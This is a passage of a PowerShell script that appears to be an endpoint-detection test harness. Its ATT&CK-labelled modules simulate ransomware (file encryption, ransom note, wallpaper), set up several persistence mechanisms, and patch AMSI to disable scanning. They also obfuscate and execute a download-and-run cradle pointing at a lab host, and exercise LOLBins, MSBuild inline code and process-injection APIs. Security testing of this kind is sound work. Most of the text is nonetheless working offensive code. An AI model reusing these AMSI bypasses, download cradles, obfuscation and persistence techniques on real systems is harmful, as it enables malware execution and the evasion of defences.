    Remove-Item $exfilZip -Force -ErrorAction SilentlyContinue

    # Encrypt files
    Write-Host ""
    Write-Detail "Starting XOR file encryption..."
    $key   = [byte]0x42
    $count = 0
    Get-ChildItem $testDir -File | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $enc   = $bytes | ForEach-Object { $_ -bxor $key }
        [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $enc)
        Remove-Item $_.FullName -Force
        Write-Evidence "ENCRYPTED: $($_.Name) --> $($_.Name).locked ($($bytes.Length) bytes)"
        $count++
    }
    Write-Host ""
    if ($count -gt 0) {
        Write-OK "$count files encrypted with .locked extension"
        Write-Evidence "Files in $testDir :"
        Get-ChildItem $testDir | ForEach-Object { Write-Evidence "  $($_.Name)" }
        Log-Result "T1486" "File encryption simulation" "EXECUTED" "$count files encrypted in $testDir"
    } else {
        Log-Result "T1486" "File encryption simulation" "BLOCKED" "No files encrypted"
    }

    # Ransom note
    Write-Host ""
    Write-Detail "Dropping ransom note..."
    $note = @"
*** YOUR FILES HAVE BEEN ENCRYPTED ***

All your documents have been encrypted with AES-256.
YOUR ID: F7K2-X9QM-3RT1-8NWZ

Send 1.5 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Contact: darknet_support@protonmail.com

Files affected: $count
Deadline: 72 hours -- price doubles after
"@
    $notePath = "$env:USERPROFILE\Desktop\!!! READ_ME_RANSOM !!!.txt"
    Set-Content $notePath $note
    Write-Evidence "Ransom note dropped: $notePath"
    Write-OK "Ransom note written to Desktop"
    Log-Result "T1486" "Ransom note deployment" "EXECUTED" $notePath

    # -- WALLPAPER RANSOMWARE (fix complet) --
    Write-Host ""
    Write-Phase "T1486" "Ransomware Wallpaper" "Red"
    Write-Detail "Generating ransom wallpaper locally via System.Drawing..."

    $wallpaperPath = "$env:TEMP\ransom_wallpaper_$([System.IO.Path]::GetRandomFileName().Replace('.','') ).bmp"

    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue

    $wallpaperSet = $false

    # -- GENERER L IMAGE BMP LOCALEMENT --
    Try {
        $bmp  = New-Object System.Drawing.Bitmap(1920, 1080)
        $gfx  = [System.Drawing.Graphics]::FromImage($bmp)
        $gfx.Clear([System.Drawing.Color]::Black)

        $fontBig  = New-Object System.Drawing.Font("Consolas", 52, [System.Drawing.FontStyle]::Bold)
        $fontMed  = New-Object System.Drawing.Font("Consolas", 26, [System.Drawing.FontStyle]::Bold)
        $fontSml  = New-Object System.Drawing.Font("Consolas", 18)
        $fontTiny = New-Object System.Drawing.Font("Consolas", 14)

        $red     = [System.Drawing.Brushes]::Red
        $yellow  = [System.Drawing.Brushes]::Yellow
        $white   = [System.Drawing.Brushes]::White
        $dkred   = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0))
        $gray    = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(130,130,130))

        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::DarkRed, 8)
        $gfx.DrawRectangle($pen, 20, 20, 1880, 1040)

        $sf = New-Object System.Drawing.StringFormat
        $sf.Alignment = [System.Drawing.StringAlignment]::Center

        $gfx.DrawString("YOUR FILES HAVE BEEN ENCRYPTED", $fontBig, $red, [System.Drawing.RectangleF]::new(0,80,1920,100), $sf)
        $gfx.DrawLine((New-Object System.Drawing.Pen([System.Drawing.Color]::DarkRed,3)), 100,180,1820,180)
        $gfx.DrawString("All your documents, databases and backups have been encrypted with AES-256.", $fontSml, $white, [System.Drawing.RectangleF]::new(0,210,1920,50), $sf)
        $gfx.DrawString("YOUR UNIQUE ID: F7K2-X9QM-3RT1-8NWZ", $fontMed, $yellow, [System.Drawing.RectangleF]::new(0,300,1920,60), $sf)
        $gfx.DrawString("Send 1.5 BTC to:", $fontSml, $white, [System.Drawing.RectangleF]::new(0,390,1920,50), $sf)
        $gfx.DrawString("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", $fontMed, $yellow, [System.Drawing.RectangleF]::new(0,440,1920,60), $sf)
        $gfx.DrawString("Contact: darknet_support@protonmail.com", $fontSml, $white, [System.Drawing.RectangleF]::new(0,520,1920,50), $sf)
        $gfx.DrawString("TIME REMAINING:", $fontSml, $red, [System.Drawing.RectangleF]::new(0,620,1920,50), $sf)
        $gfx.DrawString("71:59:59", $fontBig, $red, [System.Drawing.RectangleF]::new(0,670,1920,100), $sf)
        $gfx.DrawLine((New-Object System.Drawing.Pen([System.Drawing.Color]::DarkRed,2)), 100,810,1820,810)
        $gfx.DrawString("Do NOT restart  |  Do NOT contact law enforcement  |  Do NOT attempt to decrypt", $fontTiny, $gray, [System.Drawing.RectangleF]::new(0,830,1920,40), $sf)
        $gfx.DrawString("After 72 hours price DOUBLES  |  After 7 days data will be published", $fontTiny, $dkred, [System.Drawing.RectangleF]::new(0,875,1920,40), $sf)

        $bmp.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $gfx.Dispose(); $bmp.Dispose()

        Write-OK "Wallpaper BMP generated: $wallpaperPath ($((Get-Item $wallpaperPath).Length) bytes)"
    } Catch {
        Write-Fail "System.Drawing failed: $($_.Exception.Message)"
        Write-Detail "Trying download from Kali..."

        # Fallback -- essayer de downloader depuis Kali
        Try {
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile("http://10.0.2.100:8000/ransom.jpg", $wallpaperPath.Replace(".bmp",".jpg"))
            $wallpaperPath = $wallpaperPath.Replace(".bmp",".jpg")
            if ((Get-Item $wallpaperPath -ErrorAction SilentlyContinue).Length -gt 1000) {
                Write-OK "Downloaded from Kali: $wallpaperPath"
            }
        } Catch {
            Write-Fail "Download from Kali also failed: $($_.Exception.Message)"
        }
    }

    if (Test-Path $wallpaperPath) {
        Write-Evidence "Wallpaper file: $wallpaperPath"
        Write-Evidence "File size     : $((Get-Item $wallpaperPath).Length) bytes"

        # -- FORCER LA REGISTRY --
        reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $wallpaperPath /f 2>$null | Out-Null
        reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f 2>$null | Out-Null
        reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f 2>$null | Out-Null
        Write-Evidence "Registry updated: HKCU\Control Panel\Desktop\Wallpaper"

        # -- METHODE A: SystemParametersInfo P/Invoke --
        Try {
            Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class RansomWallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static bool Set(string path) {
        return SystemParametersInfo(20, 0, path, 0x01 | 0x02) != 0;
    }
}
"@ -ErrorAction SilentlyContinue
            $resA = [RansomWallpaper]::Set($wallpaperPath)
            Write-Evidence "Method A (SystemParametersInfo): $resA"
            if ($resA) { $wallpaperSet = $true; Write-OK "Method A SUCCESS" }
        } Catch { Write-Detail "Method A exception: $($_.Exception.Message)" }

        Start-Sleep -Milliseconds 300

        # -- METHODE B: RUNDLL32 --
        Try {
            Start-Process "RUNDLL32.EXE" -ArgumentList "user32.dll,UpdatePerUserSystemParameters ,1 ,True" -WindowStyle Hidden
            Start-Sleep -Milliseconds 800
            Write-OK "Method B (RUNDLL32 refresh) sent"
            $wallpaperSet = $true
        } Catch { Write-Detail "Method B exception: $($_.Exception.Message)" }

        # -- METHODE C: WM_SETTINGCHANGE broadcast --
        Try {
            Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class DesktopRefresh {
    [DllImport("user32.dll")]
    public static extern IntPtr SendMessageTimeout(IntPtr h, uint m, UIntPtr w, string l, uint f, uint t, out UIntPtr r);
    public static void Broadcast() {
        UIntPtr res;
        SendMessageTimeout((IntPtr)0xFFFF, 0x001A, UIntPtr.Zero, "Environment", 2, 3000, out res);
    }
}
"@ -ErrorAction SilentlyContinue
            [DesktopRefresh]::Broadcast()
            Write-OK "Method C (WM_SETTINGCHANGE broadcast) sent"
        } Catch { Write-Detail "Method C exception: $($_.Exception.Message)" }

        # -- METHODE D: Restart Explorer (plus fiable) --
        Start-Sleep -Milliseconds 500
        $regCheck = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
        Write-Evidence "Registry verify: $regCheck"

        if (-not $wallpaperSet -or $regCheck -ne $wallpaperPath) {
            Write-Detail "Methods A/B/C insufficient -- restarting Explorer..."
            Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            Start-Process explorer
            Start-Sleep -Seconds 2
            Write-OK "Method D (Explorer restart) -- wallpaper applied"
            $wallpaperSet = $true
        }

        if ($wallpaperSet) {
            Write-OK "Ransomware wallpaper applied successfully"
            Log-Result "T1486" "Ransomware wallpaper change" "EXECUTED" "Path:$wallpaperPath Methods:A+B+C+D"
        } else {
            Write-Fail "All wallpaper methods failed"
            Log-Result "T1486" "Ransomware wallpaper change" "BLOCKED" "All methods failed"
        }
    } else {
        Write-Fail "No wallpaper file available -- skipping"
        Log-Result "T1486" "Ransomware wallpaper change" "BLOCKED" "No image file"
    }
}

# ============================================================
#  MODULE 5 -- PERSISTENCE
# ============================================================

function Test-Persistence {
    Write-Phase "T1547" "Persistence -- Autostart Execution" "Yellow"

    $psCmd = "powershell -w hidden -nop -ep bypass -c `"Write-Host 'Persistence test'`""

    # Registry Run key
    Write-Detail "TEST: Registry HKCU Run key"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "EDR_Test_WinUpdate_$(Get-Random -Maximum 9999)"
    Try {
        Set-ItemProperty -Path $regPath -Name $regName -Value $psCmd -ErrorAction Stop
        $verify = (Get-ItemProperty $regPath).$regName
        Write-Evidence "Key written   : $regPath"
        Write-Evidence "Value name    : $regName"
        Write-Evidence "Value data    : $verify"
        if ($verify -eq $psCmd) {
            Write-OK "Run key persistence CONFIRMED -- executes at next logon"
            Log-Result "T1547.001" "Registry HKCU Run key persistence" "EXECUTED" "Key:$regName verified"
        } else {
            Log-Result "T1547.001" "Registry HKCU Run key" "BLOCKED" "Value not confirmed"
        }
        Remove-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue
        Write-Detail "Cleanup: Run key removed"
    } Catch {
        Write-Fail $_.Exception.Message
        Log-Result "T1547.001" "Registry Run key" "BLOCKED" $_.Exception.Message
    }

    # Scheduled Task
    Write-Host ""
    Write-Detail "TEST: Scheduled Task (onlogon)"
    $taskName = "EDR_Test_WinUpdate_$(Get-Random -Maximum 9999)"
    $taskResult = schtasks /create /tn $taskName /tr "powershell -w hidden -c exit" /sc onlogon /f 2>&1
    Write-Evidence "schtasks create: $taskResult"
    $taskQuery = schtasks /query /tn $taskName 2>&1
    Write-Evidence "schtasks query : $($taskQuery -join ' | ')"
    if ($taskQuery -notmatch "ERROR") {
        Write-OK "Scheduled task created and verified (runs at logon)"
        Log-Result "T1547.005" "Scheduled Task onlogon persistence" "EXECUTED" "Task:$taskName confirmed"
        schtasks /delete /tn $taskName /f 2>$null | Out-Null
        Write-Detail "Cleanup: task deleted"
    } else {
        Log-Result "T1547.005" "Scheduled Task persistence" "BLOCKED" "$taskResult"
    }

    # Startup folder
    Write-Host ""
    Write-Detail "TEST: Startup folder .bat"
    $startupDir  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $startupFile = "$startupDir\EDR_Test_$(Get-Random -Maximum 9999).bat"
    Try {
        "@echo off`r`npowershell -w hidden -c exit" | Set-Content $startupFile -ErrorAction Stop
        if (Test-Path $startupFile) {
            Write-Evidence "Startup file  : $startupFile"
            Write-Evidence "File size     : $((Get-Item $startupFile).Length) bytes"
            Write-OK "Startup folder persistence CONFIRMED"
            Log-Result "T1547.001" "Startup folder .bat persistence" "EXECUTED" "File:$startupFile"
            Remove-Item $startupFile -Force
            Write-Detail "Cleanup: startup file removed"
        }
    } Catch {
        Log-Result "T1547.001" "Startup folder persistence" "BLOCKED" $_.Exception.Message
    }

    # WMI subscription
    Write-Host ""
    Write-Detail "TEST: WMI Event Subscription (T1546.003)"
    Write-Evidence "IOC: WMI permanent subscription -- survives reboots, no file on disk"
    Try {
        $wmiFilter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" `
            -Arguments @{Name="EDR_Test_Filter"; EventNamespace="root\cimv2";
                         QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"} `
            -ErrorAction Stop
        Write-Evidence "WMI Filter created: $($wmiFilter.Name)"
        Write-OK "WMI Event Filter created -- subscription-based persistence possible"
        Log-Result "T1546.003" "WMI Event Subscription persistence" "EXECUTED" "Filter: $($wmiFilter.Name)"
        # Cleanup
        $wmiFilter | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Detail "Cleanup: WMI filter removed"
    } Catch {
        Write-Fail $_.Exception.Message
        Log-Result "T1546.003" "WMI Event Subscription" "BLOCKED" $_.Exception.Message
    }
}

# ============================================================
#  MODULE 6 -- AMSI BYPASS
# ============================================================

function Test-AmsiBypass {
    Write-Phase "T1562.001" "AMSI Bypass Techniques" "Magenta"
    Write-Warn "AMSI = Antimalware Scan Interface -- scans PS, WScript, .NET in memory"

    # 6A: Baseline
    Write-Detail "TEST 6A -- AmsiUtils class accessibility"
    Try {
        $amsiType = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsiType) {
            Write-Evidence "AmsiUtils found: $($amsiType.FullName)"
            Log-Result "T1562.001" "AMSI baseline -- AmsiUtils accessible" "EXECUTED" "Class found in memory"
        }
    } Catch { Log-Result "T1562.001" "AMSI baseline" "BLOCKED" $_.Exception.Message }

    # 6B: amsiInitFailed patch
    Write-Host ""
    Write-Detail "TEST 6B -- amsiInitFailed=true bypass"
    Write-Evidence "IOC: reflection to set amsiInitFailed field to true"
    Try {
        $t = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
        $f = $t.GetField("amsiInitFailed","NonPublic,Static")
        if ($f) {
            $before = $f.GetValue($null)
            $f.SetValue($null,$true)
            $after  = $f.GetValue($null)
            Write-Evidence "amsiInitFailed BEFORE: $before"
            Write-Evidence "amsiInitFailed AFTER : $after"
            if ($after -eq $true) {
                Write-OK "AMSI bypassed via amsiInitFailed=true -- scanning disabled for this session"
                Log-Result "T1562.001" "AMSI bypass via amsiInitFailed" "EXECUTED" "Field patched to true"
                $f.SetValue($null,$false)
            }
        } else {
            Log-Result "T1562.001" "AMSI amsiInitFailed patch" "BLOCKED" "Field not found"
        }
    } Catch { Log-Result "T1562.001" "AMSI amsiInitFailed" "BLOCKED" $_.Exception.Message }

    # 6C: AmsiScanBuffer reflection
    Write-Host ""
    Write-Detail "TEST 6C -- AmsiScanBuffer context field access"
    Write-Evidence "IOC: [Ref].Assembly + GetType + NonPublic + Context field access"
    Try {
        $a = [Ref].Assembly.GetTypes()
        foreach ($t in $a) {
            if ($t.Name -like "*iUtils*") {
                $fields = $t.GetFields('NonPublic,Static')
                foreach ($f in $fields) {
                    if ($f.Name -like "*Context*") {
                        Write-Evidence "Found: $($t.Name).$($f.Name) -- AmsiScanBuffer patch reachable"
                        Write-OK "Context field accessible via reflection -- patch vector confirmed"
                        Log-Result "T1562.001" "AmsiScanBuffer reflection access" "EXECUTED" "Field: $($f.Name)"
                    }
                }
            }
        }
    } Catch { Log-Result "T1562.001" "AmsiScanBuffer reflection" "BLOCKED" $_.Exception.Message }

    # 6D: Registry
    Write-Host ""
    Write-Detail "TEST 6D -- AMSI registry disable (AmsiEnable=0)"
    Try {
        $rp = "HKCU:\Software\Microsoft\Windows Script\Settings"
        if (-not (Test-Path $rp)) { New-Item $rp -Force | Out-Null }
        Set-ItemProperty $rp "AmsiEnable" 0 -Type DWord -ErrorAction Stop
        $v = (Get-ItemProperty $rp).AmsiEnable
        Write-Evidence "AmsiEnable registry = $v"
        if ($v -eq 0) {
            Write-OK "AMSI disabled via registry (affects WScript/JScript)"
            Log-Result "T1562.001" "AMSI registry disable AmsiEnable=0" "EXECUTED" "Confirmed"
        }
        Remove-ItemProperty $rp "AmsiEnable" -ErrorAction SilentlyContinue
    } Catch { Log-Result "T1562.001" "AMSI registry disable" "BLOCKED" $_.Exception.Message }

    # 6E: Provider enum
    Write-Host ""
    Write-Detail "TEST 6E -- AMSI provider enumeration"
    Try {
        $providers = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -ErrorAction Stop
        Write-Evidence "AMSI Providers ($($providers.Count)):"
        foreach ($p in $providers) {
            $clsid = Split-Path $p.Name -Leaf
            $name  = (Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$clsid" -ErrorAction SilentlyContinue)."(default)"
            Write-Evidence "  $clsid -- $name"
        }
        Log-Result "T1562.001" "AMSI provider enumeration" "EXECUTED" "$($providers.Count) providers"
    } Catch { Log-Result "T1562.001" "AMSI provider enum" "BLOCKED" $_.Exception.Message }
}

# ============================================================
#  MODULE 7 -- OBFUSCATION
# ============================================================

function Test-Obfuscation {
    Write-Phase "T1027" "PowerShell Obfuscation" "Magenta"
    $target = "IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.100/payload.ps1')"
    Write-Evidence "Target payload: $target"

    # Concat
    Write-Detail "TEST 7A -- String concatenation"
    $o = "IE"+"X"+"(Ne"+"w-Obj"+"ect N"+"et.WebClient).DownloadString('http://10.0.2.100/payload.ps1')"
    Write-Evidence "Result: $o"
    Log-Result "T1027" "String concatenation obfuscation" "EXECUTED" "Fragmented into $(($o -split '\+').Count) parts"

    # Backtick
    Write-Detail "TEST 7B -- Backtick insertion"
    $o2 = "I``E``X(N``ew-O``bject N``et.WebC``lient).DownloadString('http://10.0.2.100/payload.ps1')"
    Write-Evidence "Result: $o2"
    Log-Result "T1027" "Backtick insertion" "EXECUTED" "Backticks at key positions"

    # Base64
    Write-Detail "TEST 7C -- Base64 EncodedCommand"
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($target))
    Write-Evidence "Encoded: $($enc.Substring(0,[Math]::Min(60,$enc.Length)))..."
    $res = powershell -EncodedCommand $enc 2>&1
    Write-Evidence "Execution: $res"
    $ok = $res -notmatch "Error|Exception"
    if ($ok) { Write-OK "EncodedCommand executed" } else { Write-Fail "Blocked" }
    Log-Result "T1027" "Base64 -EncodedCommand" $(if($ok){"EXECUTED"}else{"BLOCKED"}) "Length:$($enc.Length)"

    # CHAR
    Write-Detail "TEST 7D -- CHAR array encoding"
    $chars = ($target.ToCharArray() | ForEach-Object { "[char]$([int]$_)" }) -join "+"
    Write-Evidence "CHAR encoded (first 80 chars): $($chars.Substring(0,[Math]::Min(80,$chars.Length)))..."
    Log-Result "T1027" "CHAR code array obfuscation" "EXECUTED" "$($target.Length) chars encoded"

    # XOR
    Write-Detail "TEST 7E -- XOR runtime decryption"
    $key = 0x41
    $xb  = $target.ToCharArray() | ForEach-Object { [byte]([int][char]$_ -bxor $key) }
    $dec = -join ($xb | ForEach-Object { [char]($_ -bxor $key) })
    Write-Evidence "XOR key: 0x$("{0:X2}" -f $key)"
    Write-Evidence "Decrypted: $dec"
    $match = $dec -eq $target
    if ($match) { Write-OK "XOR roundtrip verified -- payload recoverable at runtime" }
    Log-Result "T1027" "XOR runtime decryption" "EXECUTED" "Key=0x$("{0:X2}" -f $key) Roundtrip:$match"

    # SecureString
    Write-Detail "TEST 7F -- SecureString obfuscation"
    Try {
        $ss   = ConvertTo-SecureString $target -AsPlainText -Force
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
        $dec2 = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        Write-Evidence "SecureString roundtrip: $(if($dec2 -eq $target){'SUCCESS'}else{'FAILED'})"
        Log-Result "T1027" "SecureString payload hiding" "EXECUTED" "Payload hidden in SecureString"
    } Catch { Log-Result "T1027" "SecureString" "BLOCKED" $_.Exception.Message }
}

# ============================================================
#  MODULE 8 -- LOLBINS
# ============================================================

function Test-LOLBins {
    Write-Phase "T1218" "LOLBins -- Living Off The Land" "Magenta"
    Write-Warn "Ref: lolbas-project.github.io"

    $lolbins = @(
        @{Name="certutil";    Bin="certutil.exe";    MITRE="T1218";     IOC="certutil -urlcache -- common dropper"},
        @{Name="mshta";       Bin="mshta.exe";       MITRE="T1218.005"; IOC="mshta VBScript inline -- Squiblytwo"},
        @{Name="regsvr32";    Bin="regsvr32.exe";    MITRE="T1218.010"; IOC="regsvr32 remote SCT -- Squiblydoo"},
        @{Name="rundll32";    Bin="rundll32.exe";    MITRE="T1218.011"; IOC="rundll32 javascript: URI"},
        @{Name="wmic";        Bin="wmic.exe";        MITRE="T1218";     IOC="wmic process call create spawning PS"},
        @{Name="msbuild";     Bin="msbuild.exe";     MITRE="T1127.001"; IOC="MSBuild inline C# task"},
        @{Name="installutil"; Bin="installutil.exe"; MITRE="T1218.004"; IOC="InstallUtil unmanaged payload"},
        @{Name="cmstp";       Bin="cmstp.exe";       MITRE="T1218.003"; IOC="CMSTP INF UAC bypass"},
        @{Name="forfiles";    Bin="forfiles.exe";    MITRE="T1218";     IOC="forfiles spawning PS"},
        @{Name="pcalua";      Bin="pcalua.exe";      MITRE="T1218";     IOC="PCA launching PS"}
    )

    foreach ($b in $lolbins) {
        Write-Host ""
        Write-Detail "LOLBin: $($b.Name.ToUpper()) | $($b.MITRE)"
        Write-Evidence "IOC: $($b.IOC)"
        $bin = Get-Command $b.Bin -ErrorAction SilentlyContinue
        if ($bin) {
            Write-Evidence "Binary: $($bin.Source)"
            if ($b.Name -in @("wmic","forfiles","pcalua")) {
                $cmd = switch ($b.Name) {
                    "wmic"     { 'wmic process call create "powershell -w hidden -c Write-Host WMIC_LOL"' }
                    "forfiles" { 'forfiles /p c:\windows\system32 /m notepad.exe /c "powershell -w hidden -c Write-Host FORFILES_LOL"' }
                    "pcalua"   { "pcalua -m -a powershell -c Write-Host PCALUA_LOL" }
                }
                Try {
                    $r = Invoke-Expression $cmd 2>&1
                    Write-Evidence "Output: $r"
                    if ($r -match "LOL|Return") {
                        Write-OK "$($b.Name) executed via LOLBin"
                        Log-Result $b.MITRE "$($b.Name) LOLBin execution" "EXECUTED" "Output: $r"
                    } else {
                        Log-Result $b.MITRE "$($b.Name) LOLBin" "BLOCKED" "No expected output"
                    }
                } Catch { Log-Result $b.MITRE "$($b.Name) LOLBin" "BLOCKED" $_.Exception.Message }
            } else {
                $p = Start-Process $b.Bin -ArgumentList "--help" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
                if ($p) {
                    Start-Sleep -Milliseconds 300
                    Write-Evidence "Process spawned: PID $($p.Id)"
                    $p | Stop-Process -Force -ErrorAction SilentlyContinue
                    Write-OK "$($b.Name) binary accessible and spawnable (simulated)"
                    Log-Result $b.MITRE "$($b.Name) binary spawn (simulated)" "EXECUTED" "PID:$($p.Id)"
                } else {
                    Log-Result $b.MITRE "$($b.Name) spawn" "BLOCKED" "Could not start process"
                }
            }
        } else {
            Write-Warn "$($b.Bin) not found"
            Log-Result $b.MITRE "$($b.Name)" "NOT_FOUND" "Binary absent"
        }
    }

    # MSBuild inline C#
    Write-Host ""
    Write-Detail "TEST: MSBuild inline C# task (fileless .NET)"
    $xml = @'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec"><ClassExample /></Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs"><![CDATA[
      using System; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
      public class ClassExample : Task, ITask {
        public override bool Execute() { Console.WriteLine("MSBUILD_INLINE_T1127"); return true; }
      }
    ]]></Code></Task>
  </UsingTask>
</Project>
'@
    $proj = "$env:TEMP\edr_$(Get-Random).csproj"
    Set-Content $proj $xml -Encoding UTF8
    $msb  = "${env:SystemRoot}\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
    if (Test-Path $msb) {
        $r = & $msb $proj 2>&1
        if (($r -join " ") -match "MSBUILD_INLINE") {
            Write-OK "MSBuild inline C# executed -- fileless .NET payload"
            Log-Result "T1127.001" "MSBuild inline C# execution" "EXECUTED" "Code compiled+ran in memory"
        } else {
            Log-Result "T1127.001" "MSBuild inline C#" "BLOCKED" ($r -join " ")
        }
    } else { Log-Result "T1127.001" "MSBuild" "NOT_FOUND" "MSBuild.exe absent" }
    Remove-Item $proj -Force -ErrorAction SilentlyContinue
}

# ============================================================
#  MODULE 9 -- PROCESS INJECTION
# ============================================================

function Test-ProcessInjection {
    Write-Phase "T1055" "Process Injection Simulation" "Magenta"

    # VirtualAllocEx
    Write-Detail "TEST 9A -- VirtualAllocEx + WriteProcessMemory + CreateRemoteThread (T1055.002)"
    Write-Evidence "IOC: P/Invoke import of injection APIs in PowerShell process"
    $c1 = @"
using System; using System.Runtime.InteropServices;
public class InjSim {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a,bool b,int c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out IntPtr w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t);
    public static string Check() { return "VirtualAllocEx+WriteProcessMemory+CreateRemoteThread loaded (T1055.002)"; }
}
"@
    Try {
        Add-Type -TypeDefinition $c1 -ErrorAction Stop
        $r = [InjSim]::Check()
        Write-Evidence $r
        Write-OK "Injection APIs imported in PS process -- EDR should alert"
        Log-Result "T1055.002" "VirtualAllocEx+WPM+CRT API import" "EXECUTED" $r
    } Catch { Log-Result "T1055.002" "Injection API import" "BLOCKED" $_.Exception.Message }

    # QueueUserAPC
    Write-Host ""
    Write-Detail "TEST 9B -- QueueUserAPC + NtTestAlert (T1055.004 -- Early Bird APC)"
    $c2 = @"
using System; using System.Runtime.InteropServices;
public class APCSim {
    [DllImport("kernel32.dll")] public static extern bool QueueUserAPC(IntPtr f,IntPtr t,UIntPtr d);
    [DllImport("ntdll.dll")]    public static extern uint NtTestAlert();
    public static string Check() { return "QueueUserAPC+NtTestAlert loaded (T1055.004 Early Bird)"; }
}
"@
    Try {
        Add-Type -TypeDefinition $c2 -ErrorAction Stop
        Write-Evidence ([APCSim]::Check())
        Write-OK "APC injection APIs accessible"
        Log-Result "T1055.004" "QueueUserAPC + NtTestAlert API import" "EXECUTED" "Early Bird APC pattern"
    } Catch { Log-Result "T1055.004" "APC injection" "BLOCKED" $_.Exception.Message }

    # Process Hollowing
    Write-Host ""
    Write-Detail "TEST 9C -- NtUnmapViewOfSection (T1055.012 -- Process Hollowing)"
    $c3 = @"
using System; using System.Runtime.InteropServices;
public class HollowSim {
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h,IntPtr b);
    public static string Check() { return "NtUnmapViewOfSection loaded (T1055.012 Hollowing)"; }
}
"@
    Try {
        Add-Type -TypeDefinition $c3 -ErrorAction Stop
        Write-Evidence ([HollowSim]::Check())
        Write-OK "Hollowing API accessible"
        Log-Result "T1055.012" "NtUnmapViewOfSection API import" "EXECUTED" "Process hollowing vector"
    } Catch { Log-Result "T1055.012" "Process hollowing" "BLOCKED" $_.Exception.Message }

    # Reflective load
    Write-Host ""
    Write-Detail "TEST 9D -- Reflective Assembly.Load(byte[]) (T1620)"
    Try {
        $asm   = [System.Reflection.Assembly]::GetExecutingAssembly()
        $bytes = [System.IO.File]::ReadAllBytes($asm.Location)
        $loaded= [System.Reflection.Assembly]::Load($bytes)
        Write-Evidence "Assembly loaded in memory: $($loaded.FullName)"
        Write-Evidence "Size: $($bytes.Length) bytes"
        Write-OK "Reflective load succeeded -- fileless .NET execution"
        Log-Result "T1620" "Reflective Assembly.Load(byte[])" "EXECUTED" "$($bytes.Length) bytes"
    } Catch { Log-Result "T1620" "Reflective assembly load" "BLOCKED" $_.Exception.Message }

    # PPID spoofing
    Write-Host ""
    Write-Detail "TEST 9E -- PPID Spoofing APIs (T1134.004)"
    $c4 = @"
using System; using System.Runtime.InteropServices;
public class PPIDSim {
    [DllImport("kernel32.dll")] public static extern IntPtr InitializeProcThreadAttributeList(IntPtr a,int b,int c,ref IntPtr d);
    [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(IntPtr a,uint b,IntPtr c,IntPtr d,IntPtr e,IntPtr f,IntPtr g);
    public static string Check() { return "UpdateProcThreadAttribute (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) available"; }
}
"@
    Try {
        Add-Type -TypeDefinition $c4 -ErrorAction Stop
        Write-Evidence ([PPIDSim]::Check())
        Write-OK "PPID spoofing APIs accessible"
        Log-Result "T1134.004" "PPID spoofing API availability" "EXECUTED" "PROC_THREAD_ATTRIBUTE_PARENT_PROCESS"
    } Catch { Log-Result "T1134.004" "PPID spoofing" "BLOCKED" $_.Exception.Message }
}

# ============================================================
#  MODULE 10 -- BYOVD
# ============================================================

function Test-BYOVD {
    Write-Phase "T1068/T1543.003" "BYOVD -- Bring Your Own Vulnerable Driver" "Magenta"
    Write-Warn "Ref: loldrivers.io"

    # Driver enumeration
    Write-Detail "TEST 10A -- Driver enumeration (recon)"
    Try {
        $drivers = Get-WmiObject Win32_SystemDriver
